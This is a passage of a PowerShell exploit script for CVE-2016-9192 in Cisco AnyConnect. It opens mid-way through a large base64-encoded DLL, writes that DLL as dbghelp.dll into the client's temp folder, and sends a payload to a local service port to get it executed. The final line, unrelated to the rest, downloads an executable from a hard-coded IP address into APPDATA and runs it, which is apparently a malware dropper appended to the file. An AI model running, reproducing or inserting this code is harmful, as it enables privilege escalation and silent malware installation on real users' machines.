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4aXQAX2ZpcnN0X2F0ZXhpdABfbmV4dF9hdGV4aXQAX0RsbE1haW5DUlRTdGFydHVwQDEyAC5laF9mcmFtZQBfX19KQ1JfTElTVF9fAF9fX2djY19yZWdpc3Rlcl9mcmFtZQBfX19nY2NfZGVyZWdpc3Rlcl9mcmFtZQAucmRhdGEkenp6AF9fWjZUaHJlYWRQdkA0AF9EbGxNYWluQDEyAF9fX2R5bl90bHNfZHRvckAxMgBfX19keW5fdGxzX2luaXRAMTIAX19fdGxyZWdkdG9yAF9fX3JlcG9ydF9lcnJvcgBfX193cml0ZV9tZW1vcnkucGFydC4wAF9fcGVpMzg2X3J1bnRpbWVfcmVsb2NhdG9yAF93YXNfaW5pdC4zMTA0OABfX19kb19nbG9iYWxfZHRvcnMAX19fZG9fZ2xvYmFsX2N0b3JzAF9pbml0aWFsaXplZABfX19taW5nd3Rocl9ydW5fa2V5X2R0b3JzLnBhcnQuMABfX19taW5nd3Rocl9jcwBfa2V5X2R0b3JfbGlzdABfX19fdzY0X21pbmd3dGhyX2FkZF9rZXlfZHRvcgBfX19taW5nd3Rocl9jc19pbml0AF9fX193NjRfbWluZ3d0aHJfcmVtb3ZlX2tleV9kdG9yAF9fX21pbmd3X1RMU2NhbGxiYWNrAHBzZXVkby1yZWxvYy1saXN0LmMALmRlYnVnX2luZm8ALmRlYnVnX2FiYnJldgAuZGVidWdfYXJhbmdlcwAuZGVidWdfbGluZQBfX19KQ1JfRU5EX18AX3JlZ2lzdGVyX2ZyYW1lX2N0b3IALnRleHQuc3RhcnR1cAAuY3RvcnMuNjU1MzUAX1ZpcnR1YWxQcm90ZWN0QDE2AF9fX1JVTlRJTUVfUFNFVURPX1JFTE9DX0xJU1RfXwBfX2RhdGFfc3RhcnRfXwBfX19EVE9SX0xJU1RfXwBfX2ltcF9fVmlydHVhbFByb3RlY3RAMTYALndlYWsuX19Kdl9SZWdpc3RlckNsYXNzZXMuX19fZ2NjX3JlZ2lzdGVyX2ZyYW1lAF9faW1wX19HZXRMYXN0RXJyb3JAMABfX2ltcF9fVmlydHVhbFF1ZXJ5QDEyAF9fX3Rsc19zdGFydF9fAF9faW1wX19UbHNHZXRWYWx1ZUA0AF9fbGlibXN2Y3J0X2FfaW5hbWUAX19pbXBfX0luaXRpYWxpemVDcml0aWNhbFNlY3Rpb25ANABfRGVsZXRlQ3JpdGljYWxTZWN0aW9uQDQAX19ydF9wc3JlbG9jc19zdGFydABfX2ltcF9fYWJvcnQAX19kbGxfY2hhcmFjdGVyaXN0aWNzX18AX19zaXplX29mX3N0YWNrX2NvbW1pdF9fAF9fc2l6ZV9vZl9zdGFja19yZXNlcnZlX18AX19tYWpvcl9zdWJzeXN0ZW1fdmVyc2lvbl9fAF9fX2NydF94bF9zdGFydF9fAF9fX2NydF94aV9zdGFydF9fAF9fX2NydF94aV9lbmRfXwBfR2V0TGFzdEVycm9yQDAAX1ZpcnR1YWxRdWVyeUAxMgBfbWluZ3dfaW5pdGx0c2Ryb3RfZm9yY2UAX19pbXBfX19pb2IAX0dldE1vZHVsZUhhbmRsZUFANABfX2Jzc19zdGFydF9fAF9fX1JVTlRJTUVfUFNFVURPX1JFTE9DX0xJU1RfRU5EX18AX0NyZWF0ZVRocmVhZEAyNABfX3NpemVfb2ZfaGVhcF9jb21taXRfXwBfX2ltcF9fX2Vycm5vAF9faW1wX19HZXRQcm9jQWRkcmVzc0A4AF9HZXRQcm9jQWRkcmVzc0A4AF9fX2NydF94cF9zdGFydF9fAF9fX2NydF94cF9lbmRfXwBfX21pbm9yX29zX3ZlcnNpb25fXwBfX2hlYWRfbGlibXN2Y3J0X2EAX19pbWFnZV9iYXNlX18AX19zZWN0aW9uX2FsaWdubWVudF9fAF9faW1wX19DcmVhdGVUaHJlYWRAMjQAX19JQVRfZW5kX18AX19SVU5USU1FX1BTRVVET19SRUxPQ19MSVNUX18AX190bHNfc3RhcnQAX19kYXRhX2VuZF9fAF9fQ1RPUl9MSVNUX18AX19ic3NfZW5kX18AX19fY3J0X3hjX2VuZF9fAF9fdGxzX2luZGV4AF9fX2NydF94Y19zdGFydF9fAF9fX0NUT1JfTElTVF9fAF9fcnRfcHNyZWxvY3Nfc2l6ZQBfX2ltcF9fX19kbGxvbmV4aXQAX19pbXBfX21lbWNweQBfX2ZpbGVfYWxpZ25tZW50X18AX19pbXBfX0xlYXZlQ3JpdGljYWxTZWN0aW9uQDQAX19pbXBfX21hbGxvYwBfX21ham9yX29zX3ZlcnNpb25fXwBfX0lBVF9zdGFydF9fAF9fdGxzX2VuZABfX2ltcF9fR2V0TW9kdWxlSGFuZGxlQUA0AF9fX2RsbG9uZXhpdABfX0RUT1JfTElTVF9fAF9FbnRlckNyaXRpY2FsU2VjdGlvbkA0AF9faW1wX19mY2xvc2UAX19zaXplX29mX2hlYXBfcmVzZXJ2ZV9fAF9fX2NydF94dF9zdGFydF9fAF9fX0ltYWdlQmFzZQBfX3N1YnN5c3RlbV9fAF9faW1wX19mZmx1c2gAX19pbXBfX2NhbGxvYwBfX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfX2ltcF9fZm9wZW4AX19fdGxzX2VuZF9fAF9taW5nd19pbml0bHRzc3VvX2ZvcmNlAF9Jbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQDQAX19pbXBfX2ZyZWUAX19tYWpvcl9pbWFnZV92ZXJzaW9uX18AX19sb2FkZXJfZmxhZ3NfXwBfX2hlYWRfbGlia2VybmVsMzJfYQBfX3J0X3BzcmVsb2NzX2VuZABfX21pbm9yX3N1YnN5c3RlbV92ZXJzaW9uX18AX19taW5vcl9pbWFnZV92ZXJzaW9uX18AX19pbXBfX3ZmcHJpbnRmAF9taW5nd19pbml0bHRzZHluX2ZvcmNlAF9UbHNHZXRWYWx1ZUA0AF9faW1wX19EZWxldGVDcml0aWNhbFNlY3Rpb25ANABfTGVhdmVDcml0aWNhbFNlY3Rpb25ANABfX1JVTlRJTUVfUFNFVURPX1JFTE9DX0xJU1RfRU5EX18AX19saWJrZXJuZWwzMl9hX2luYW1lAF9fX2R5bl90bHNfaW5pdF9jYWxsYmFjawBfX3Rsc191c2VkAF9fX2NydF94dF9lbmRfXwBfdmZwcmludGYAX19pbXBfX0VudGVyQ3JpdGljYWxTZWN0aW9uQDQAX19pbXBfX2Z3cml0ZQA="
    $Exploited = "C:\CVE-2016-9192.txt"
    $TempFolder = "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Temp"
    $TempPath = "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Temp\Downloader"
    $DLLLocation = "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Temp\Downloader\dbghelp.dll"

    if ($CustomDLL) {
        Write-Output "[.] Using custom DLL: $CustomDLL"
        $Base64Dll = ConvertTo-Base64 $CustomDLL
    }

    $PathExists = Test-Path $TempPath
    if (!$PathExists) {
        New-Item $TempPath -ItemType Directory | Out-Null
    }
    
    $PathExists = Test-Path $DLLLocation
    if (!$PathExists) {
        Write-Output "[.] Dropping DLL to disk: $DLLLocation"
        $fileBytes = [Convert]::FromBase64String($Base64Dll)
        [io.file]::WriteAllBytes($DLLLocation, $fileBytes)
    } else {
        Write-Output "[.] Using DLL already in the following location: $DLLLocation"        
    }

    Write-Output "[.] Connecting to localhost on port 62522"
    try
    {
	    $socket = New-Object System.Net.Sockets.TcpClient( "127.0.0.1", "62522" )
        Write-Output "[.] Sucessfully connected to localhost on port 62522"
    }
    catch
    {
        Write-Output "`n[-] Connection failed, is Cisco Anyconnect running"
	    exit -1
    }

    $stream = $socket.GetStream();
    $stream.Write($payload,0,$payload.Length);
    $stream.Flush();
    $stream.Close();
    
    Start-Sleep 2

    if ($CustomDLL) {
        Write-Output "`n[+] Exploitted, custom DLL should have been executed!"
    } else {
        $PathExists = Test-Path $Exploited
        if (!$PathExists) {
            Write-Output "`n[-] Exploit failed!"
        } else {
            Write-Output "`n[+] Exploit successful! Target is vulnerable to CVE-2016-9192"  
            Write-Output "[+] To add a custom DLL use the following command: Invoke-CVE-2016-9192 -CustomDLL <Path to DLL>"      
        }
    }

    Write-Output "[+] Manual removal of $TempFolder required"
}
function ConvertTo-Base64
{
    param
    (
        [string] $Source
    )
    $bufferSize = 90000
    $buffer = New-Object byte[] $bufferSize

    $reader = [System.IO.File]::OpenRead($Source)
    $base64 = $null
    $bytesRead = 0

    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
    } while ($bytesRead -eq $bufferSize);

    $reader.Dispose()
    $base64
}
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

